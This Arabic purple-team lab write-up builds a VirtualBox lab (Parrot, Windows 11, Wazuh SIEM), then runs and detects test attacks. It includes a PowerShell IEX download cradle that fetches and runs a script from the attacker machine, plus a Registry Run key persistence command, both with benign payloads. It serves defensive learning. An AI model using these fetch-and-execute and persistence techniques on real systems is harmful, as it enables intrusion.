**مختبر Purple Team: من بناء البيئة من الصفر إلى أول هجوم موثّق**

## المرحلة 1: تثبيت Parrot Security OS

### المحاولة الأولى: فشل متكرر

**المشكلة:** عند التثبيت في وضع Install أو Try/Live ظهر الخطأ:

```
grub-install --target=i386-pc --recheck --force /dev/sda returned error code 127
```

**محاولات الحل:**

- زيادة الذاكرة المخصصة من 2GB إلى 4GB: لم تحل المشكلة.
- تجربة Advanced Modes من قائمة الإقلاع: لم تكن الحل الصحيح، لأنها أوضاع لتشغيل Live وليست أوضاع تثبيت للـ session نفسه.

### مشكلة كلمة المرور

عند تسجيل الدخول لأول مرة ظهرت رسالة `Your password is incorrect` رغم أنني كتبتها بشكل صحيح. **السبب:** تعارض في تخطيط لوحة المفاتيح (Keyboard Layout) وقت التثبيت.

### الحل النهائي

إعادة تثبيت كاملة من ISO جديد (Parrot Security Edition) بنفس الإعدادات تمامًا، فنجح التثبيت دون أي تعديل إضافي واضح.

> **الدرس:** أحيانًا التكرار المنضبط للخطوات نفسها هو النتيجة، وهذا بحد ذاته يستحق التوثيق.

### مشكلة عرض إضافية

بعد نجاح التثبيت ظهرت أخطاء عند التشغيل:

```
ERROR *vmwgfx* failed enable_uvma
RCU stall
```

**الحل:** في VirtualBox ← Display ← تغيير Graphics Controller من الافتراضي إلى `VBoxSVGA`.

⏱️ **الوقت المستغرق لهذه المرحلة:** نحو 3 أيام من المحاولات المتكررة.

## المرحلة 2: تثبيت Windows 11 (الضحية)

### إعدادات أساسية لازمة

فعّلت `UEFI` و `TPM 2.0` و `Secure Boot` من:
**Settings ← System ← Motherboard**، وإلا يرفض VirtualBox تثبيت Windows 11.

ذكر التوثيق الأول نسخة **Windows 11 Evaluation** (صالحة 90 يومًا)، لكن الفحص اللاحق أظهر أن المثبّت فعليًا **Windows 11 Home** (البناء 26200).

### مشكلة Unattended Installation

**المشكلة:** شاشة سوداء متكررة عند أول تشغيل.

**السبب:** استخدام ميزة Unattended Installation التلقائية في VirtualBox، وهي تعمل خلف الكواليس بدون واجهة مرئية.

**الحل:**

1. حذف ملف Unattended من Storage.
2. ربط ملف ISO الأصلي مباشرة.
3. ضبط Boot Order بحيث يكون Optical قبل Hard Disk.

### مشكلة قرص فارغ

**المشكلة:** بعد حذف الإعداد التلقائي وإعادة إنشاء الجهاز، اكتشفت أن قرص ISO لم يعد مربوطًا بالجهاز.

**الحل:** إعادة إضافة ISO يدويًا من `Storage ← Add optical drive`.

## المرحلة 3: ربط الأجهزة بشبكة labnet

### الإعداد

- تغيير Network Adapter لكل من Parrot و Windows من `NAT` إلى `Internal Network` باسم موحّد: **`labnet`**.
- تخصيص عنوان IP ثابت لكل جهاز يدويًا، لأن Internal Network لا تحتوي DHCP:

| الجهاز | العنوان |
|---|---|
| Parrot | `192.168.100.10` |
| Windows | `192.168.100.20` |
| Wazuh SOC | `192.168.100.30` (يُضاف لاحقًا) |

### مشكلة متكررة عبر كامل المشروع: فقدان الاتصال بعد كل إعادة تشغيل

VirtualBox لا يحفظ هذه الإعدادات بشكل دائم، فبعد كل إعادة تشغيل لأي جهاز يجب إعادة تفعيل العنوان يدويًا. كان هذا النمط الأكثر تكرارًا في المشروع كله:

```bash
sudo ip addr add [IP]/24 dev enp0s3
sudo ip link set enp0s3 up
```

> **الدرس التقني:** إعدادات الشبكة المؤقتة (non-persistent) لا تناسب بيئات الاختبار الافتراضية.
> **تحسين مستقبلي:** استخدام آلية تثبيت دائمة، مثل تعديل ملفات `netplan`.

### مشكلة Windows Firewall يحجب ICMP

**المشكلة:** فشلت أول محاولات `ping` من Windows إلى Parrot بالكامل رغم صحة إعدادات الشبكة.

**السبب:** Windows Firewall يحجب طلبات ICMP افتراضيًا.

**الحل:**

```powershell
netsh advfirewall firewall add rule name="ICMP Allow" protocol=icmpv4:8,any dir=in action=allow
```

بعد هذا الحل نجح `ping` بشكل كامل ومستقر.

## المرحلة 4: تثبيت Wazuh SIEM

### القرار الهندسي: فصل الأدوار

حاولت أولًا تثبيت Wazuh مباشرة على Parrot، لكن فشل التثبيت بالخطأ:

```
ERROR: Cannot install dependency: software-properties-common
```

**السبب الجذري:** عدم توافق بنية مستودعات الحزم (package repositories) بين Parrot Security OS و Wazuh. التوزيعات المدعومة رسميًا هي: RHEL و CentOS و Ubuntu و Debian.

**القرار:** بدل إصلاح التوافق، أضفت جهازًا مخصصًا: **Ubuntu Server 22.04 LTS** يكون بيئة Dashboard/Manager، ويبقى Parrot للدور الهجومي فقط. وهذا يعكس ممارسة حقيقية في بيئات العمل: فصل الأدوار حسب التوافق التقني.

### مشاكل التثبيت على Ubuntu Server (بالترتيب الزمني)

| # | المشكلة | السبب | الحل |
|---|---|---|---|
| 1 | `Cannot import Wazuh GPG key` | كشف `curl -v` أن السبب `Could not resolve host`: الجهاز فقد الإنترنت مؤقتًا بسبب مشكلة الشبكة المتكررة | تحميل المفتاح يدويًا، والتأكد بـ `cat` أنه يبدأ بـ `BEGIN PGP PUBLIC KEY BLOCK`، ثم استيراده يدويًا |
| 2 | `Connection timed out` أثناء تحميل ملف wazuh-indexer (نحو 850MB) | انقطاع الاتصال أثناء التحميل | إعادة تشغيل سكربت التثبيت من جديد |
| 3 | `soft lockup - CPU#1 stuck for 308s` و `wazuh-indexer could not be started` | الموارد المخصصة (معالجان) لا تكفي لتشغيل Wazuh Indexer المبني على Elasticsearch | رفع الذاكرة إلى 4096MB ورفع المعالجات إلى 4 |
| 4 | `soft lockup - CPU#0 stuck for 605s` و `Network is unreachable` | ضغط موارد أثناء الاستخدام العادي بعد نجاح التثبيت، وليس أثناء التثبيت | انتظار تعافي النظام، أو إعادة تشغيل كاملة `sudo reboot` عند الحاجة |

استيراد مفتاح GPG يدويًا:

```bash
curl -sL https://packages.wazuh.com/key/GPG-KEY-WAZUH -o wazuh-key.gpg
sudo gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import wazuh-key.gpg
sudo chmod 644 /usr/share/keyrings/wazuh.gpg
```

**الفرق بين المشكلتين 3 و 4:** الأولى حدثت أثناء التثبيت، والثانية بعد نجاحه أثناء الاستخدام العادي. وهذا يدل على أن Wazuh يحتاج تخطيط موارد مستمرًا (resource planning)، وليس فقط وقت التثبيت.

### النجاح

بعد حل المشاكل الأربع اكتمل التثبيت:

```
✅ Wazuh indexer installation finished
✅ Wazuh manager installation finished
✅ Filebeat installation finished
✅ Wazuh dashboard installation finished
```

وتم الوصول إلى لوحة التحكم عبر `https://192.168.100.30` من متصفح جهاز Windows.

## المرحلة 5: ربط Windows كـ Wazuh Agent

### التثبيت

```powershell
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.9.2-1.msi -OutFile wazuh-agent.msi
NET START WazuhSvc
```

### مشكلة: Windows بدون اتصال إنترنت

واجهت نفس نمط المشكلة السابقة:

```
The remote name could not be resolved: 'packages.wazuh.com'
```

**السبب:** جهاز Windows كان متصلًا فقط بشبكة `labnet` المعزولة.

**الحل:** إضافة `Adapter 2` بنمط NAT لجهاز Windows، بنفس الطريقة التي استخدمتها مع الأجهزة الأخرى.

> **ملاحظة لاحقة:** هذه الواجهة الثانية (NAT) هي التي سببت لاحقًا التباسًا في التوجيه (Routing) أثناء الهجوم، وتفاصيل ذلك في التوثيقات التالية.

### النتيجة

تم تثبيت الـ Agent بنجاح، وظهر جهاز `WINTARGET` في لوحة Wazuh بحالة **Active**.

## المرحلة 6: تنفيذ الهجوم الأول

**PowerShell Fileless Execution**

### الإعداد

1. تفعيل **PowerShell Script Block Logging** على Windows عبر Registry (المسار: `HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging`).
2. إعداد سيرفر HTTP بسيط على Parrot لاستضافة سكربت تجريبي غير ضار:

```bash
mkdir ~/lab-server && cd ~/lab-server
echo "Get-ComputerInfo | Select-Object CsName, OsName, OsVersion" > test-script.ps1
python3 -m http.server 8000
```

### التنفيذ

من جهاز Windows:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.10:8000/test-script.ps1')
```

### النتيجة: نجاح كامل

```
CsName      OsName                      OsVersion
------      ------                      ---------
WINTARGET   Microsoft Windows 11 Home   10.0.26200
```

تم تحميل السكربت من Parrot وتنفيذه مباشرة في ذاكرة Windows، **دون حفظ أي ملف على القرص**. وهذا إثبات ناجح لمفهوم Fileless Execution.

## المرحلة 7: تحليل الشبكة بـ Wireshark

### الهدف

إضافة تحليل جديد للمشروع: مراقبة الترافيك الفعلي أثناء الهجوم، وعدم الاكتفاء بتحليل مستوى الـ Host فقط.

### التنفيذ

شغّلت Wireshark على الواجهة `enp0s3` في جهاز Parrot أثناء تنفيذ أمر الهجوم من Windows، والتقطت الحزمة الخاصة بطلب HTTP:

```
GET /test-script.ps1 HTTP/1.1
Host: 192.168.100.10:8000
```

### الاكتشاف التحليلي المهم

باستخدام **Follow HTTP Stream** ظهر محتوى السكربت بالكامل بنص واضح غير مشفّر:

```
Get-ComputerInfo | Select-Object CsName, OsName, OsVersion
```

**التحليل:** استخدام HTTP العادي بدل HTTPS يجعل محتوى PowerShell مكشوفًا بالكامل لأي مراقب على الشبكة. وهذا يوضح أهمية المراقبة على مستوى الشبكة (Network-level detection) كطبقة دفاعية مستقلة عن سجلات النظام (Host-level logging)، ونقطة تحليلية قوية للمشروع.

## 📍 نقطة التوقف في المرحلة الأولى (تاريخية)

> هذا وصف لما كان عليه المشروع في نهاية التوثيق الأول. وقد حُلّت مشكلة غياب التنبيه لاحقًا بالقاعدة `100010` (انظر `technical-diary.md`)، والحالة الحالية في القسم التالي «الحالة والحدود المعروفة».

بعد نجاح الهجوم وتوثيقه على مستوى الشبكة، حاولت التأكد من ظهور تنبيه (Alert) خاص بـ PowerShell في لوحة Wazuh، ولم يظهر بعد رغم أن:

- تفعيل Script Block Logging تم على Windows.
- أضفت إلى `ossec.conf` على الـ Agent قناة أحداث PowerShell:

```xml
<localfile>
  <location>Microsoft-Windows-PowerShell/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

- أعدت تشغيل خدمة `WazuhSvc` وتأكدت أنها `Running`.
- أعدت تنفيذ الهجوم بعد كل تعديل.

**الخطوة التالية:** التأكد من أن ملف `ossec.conf` يحتوي التعديل بشكل صحيح، وتصحيح أي خطأ إملائي (حدث سابقًا خطأ بكتابة `PowerSell` بدل `PowerShell`):

```powershell
Get-Content "C:\Program Files (x86)\ossec-agent\ossec.conf" | Select-String "PowerShell"
```

## 📚 ملخص الدروس التقنية

1. **أفحص توافق الأدوات قبل التنفيذ.** فحص توافق الأدوات (مثل Wazuh و Parrot) مع نظام التشغيل قبل البدء كان سيوفر وقتًا كبيرًا لو تم مبكرًا.
2. **إعدادات IP اليدوية في VirtualBox لا تُحفظ تلقائيًا.** وتحتاج تثبيتًا دائمًا في أي نسخة مستقبلية من المشروع.
3. **الموارد ليست مسألة تثبيت فقط.** أدوات SIEM الحقيقية تحتاج تخطيط موارد مستمرًا أثناء التشغيل الفعلي، لا وقت الإعداد فقط.
4. **HTTP يكشف كل شيء.** مرور محتوى الهجوم بنص واضح عبر الشبكة هو درس عملي في أهمية التشفير.
5. **أوثّق أثناء العمل وليس بعده.** تسجيل كل مشكلة وحلها لحظة حدوثها، بدل محاولة تذكرها لاحقًا، هو أساس بناء هذا الملف.

## 🚀 توسعة متقدمة: الاستجابة الآلية (Active Response / SOAR)

> أُضيف هذا القسم بعد حل مشكلة الكشف وظهور التنبيهات في Wazuh.

### الهدف

نقل المختبر من الكشف إلى **الاستجابة**: ربط التنبيه بأمر يُنفَّذ تلقائيًا على جهاز الضحية دون تدخل المحلل، لتقليل زمن الاستجابة (MTTR). السيناريو: عند اكتشاف تعديل مفتاح Registry للاستمرارية (Registry Run Key، القاعدة `92302`) يُنفَّذ أمر الاستجابة على الـ Agent.

### الإعداد

في `/var/ossec/etc/ossec.conf` على الـ Manager:

```xml
<active-response>
  <command>netsh</command>
  <location>defined-agent</location>
  <agent_id>001</agent_id>
  <rules_id>92302</rules_id>
  <timeout>60</timeout>
</active-response>
```

- `command`: أمر `netsh` المعرّف في Wazuh (يشغّل `netsh.exe` على Windows).
- `agent_id` `001`: جهاز `WINTARGET` فقط.
- `rules_id` `92302`: يُنفَّذ فقط عند إطلاق هذه القاعدة.
- `timeout` `60`: مدة الإجراء بالثواني.

### التجربة

إنشاء مفتاح استمرارية على Windows 11:

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v LabTest /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
```

أطلق Wazuh التنبيه `92302` بمستوى خطورة 6، وفي سجل الـ Agent المحلي
`C:\Program Files (x86)\ossec-agent\active-response\active-responses.log` ظهر:

```
2026/10/11 19:44:11 active-response/bin/netsh.exe Starting
```

بعد سطر `Starting` ظهر في السجل نفسه سطر بصيغة JSON يذكر `active-response/bin/netsh.exe`، ثم رسالة:

```
Cannot read 'srcip' from data
```

### كيف وصلت إلى هذا الإعداد

لم تنجح الاستجابة من أول مرة:

| # | ماذا حصل | السبب أو التشخيص | الإجراء |
|---|---|---|---|
| 1 | أول إعداد بالأمر `firewall-drop` ولم يظهر أي أثر في سجل Windows | سكربت `firewall-drop` الافتراضي مصمم لأنظمة Linux (يعتمد `iptables`) فلا يناسب Windows | استبداله بالأمر `netsh` |
| 2 | توقفت خدمة المدير وظهر `wazuh-csyslogd: Configuration error. Exiting` | وسم الإغلاق كان `</agent>` بدل `</agent_id>` | تصحيح الوسم وإعادة تشغيل `wazuh-manager` |
| 3 | في السجل ظهر فقط `restart-wazuh.exe` (Starting ثم Ended في 19:36) | سجلات إعادة تشغيل الخدمة وليست استجابة للهجوم | متابعة التشخيص |
| 4 | فرضية أن Wazuh لا يشغّل الاستجابة للمستوى 6 | لم أتحقق منها، وعلى حد علمي لا يوجد حد أدنى افتراضي يمنع المستوى 6 | ليست هي ما حلّ المشكلة |
| 5 | تغيير الأمر إلى `netsh` | أمر Windows المعرّف في Wazuh | ظهر `netsh.exe` في السجل |

### ما أثبتته وما لم يحصل

| | الحالة |
|---|---|
| ربط القاعدة `92302` بأمر يُنفَّذ تلقائيًا على الـ Agent بلا تدخل بشري | ✅ مثبت (`Starting` في 19:44:08) |
| حدوث احتواء فعلي للتهديد | ❌ لم يحصل |

رسالة `Cannot read 'srcip' from data` تعني أن سكربت `netsh` يحاول قراءة عنوان IP المصدر من التنبيه ليحظره، ولم يجده لأن تنبيه تعديل Registry محلي ولا يحمل `srcip`. فالأمر بدأ ثم لم يجد شيئًا يحظره، ومفتاح التثبيت لم يُمسّ.

**الخلاصة:** الاستجابة الآلية فُعّلت بنجاح كآلية، لكن الأمر الذي اخترته (حظر IP) لا يناسب هذا النوع من التهديد. الرسالة متوقعة في هذا السيناريو، لكنها لا تثبت أي حظر أو احتواء.

### تصحيح ومتابعة: استجابة تعمل أوسع من المقصود

عند مراجعة السجل لاحقًا (13 أكتوبر 2026) تبيّن أن:

- القاعدة `92302` شغّلت الاستجابة **مرة واحدة** فقط (19:44:08) ثم ظهر خطأ `srcip`. أما `Starting` في 19:44:11 وما بعده فكان للقاعدة `100010`.
- عدد سطور `Starting` وصل إلى 43 ثم 62، لأن بلوك `active-response` كان فيه السطر `<level>6</level>` (على حد علمي يجعل الاستجابة تعمل على أي تنبيه مستواه 6 فأكثر)، فكل أمر PowerShell عادي كان يولّد الحدث 4104 فالقاعدة `100010` فالاستجابة.
- لم يظهر سطر `Ended` لـ `netsh` أبدًا.

**الإصلاح:** نسخة احتياطية، ثم حذف سطر `level`، ثم إعادة تشغيل `wazuh-manager`. وأثناء الإصلاح استخدمت أمر `mv` على `ossec.conf` نفسه بالخطأ فتوقفت الخدمة، وأعدته. **الدرس:** لا `mv` على ملفات الإعداد، واستخدام `cp` مع التأكد من المسار.

**التحقق (اختباران):**

1. بأوامر PowerShell عادية لنحو 5 دقائق: `62 -> 62`، أي لا استجابة جديدة.
2. بعد إضافة مفتاح Run غير ضار (`LabTestFix`) ثم حذفه:

| | قبل | بعد |
|---|---|---|
| سطور `Starting` | 62 | 63 |
| سطور القاعدة `92302` | 1 | 2 |

- **`92302` ما زالت تشغّل الاستجابة** بعد حذف سطر `level` (ثم خطأ `srcip` كالعادة، فلا احتواء).
- **`100010` لم تعد تشغّلها** على الأوامر العادية.
- بدأت الاستجابة بعد نحو **43 ثانية** كحد أعلى من T0 (قيس على ساعة Windows وحدها).
- **تصحيح الساعة:** قراءة متقاربة لاحقة أظهرت أن ساعة Manager متقدمة نحو 4 إلى 5 دقائق عن Windows (وليس دقيقتين) وأن الفرق يكبر مع الوقت، لأن `systemd-timesyncd` بحالة Idle في الشبكة المعزولة. لذلك أزمنة الكشف المقارِنة بين الجهازين غير موثوقة، والرقم الوحيد الموثوق هو بدء الاستجابة بعد نحو 43 ثانية (ساعة Windows وحدها). والسبب الدقيق للانحراف غير معروف.

**الخطوات القادمة:**

- البحث عن سطر `Ended` بعد `Starting` في `active-responses.log`.
- فحص قواعد جدار Windows للتأكد أنه لم تُضف قاعدة حظر.
- تجربة سكربت استجابة مخصص يحذف مفتاح Run المعني بدل الاعتماد على `netsh`.
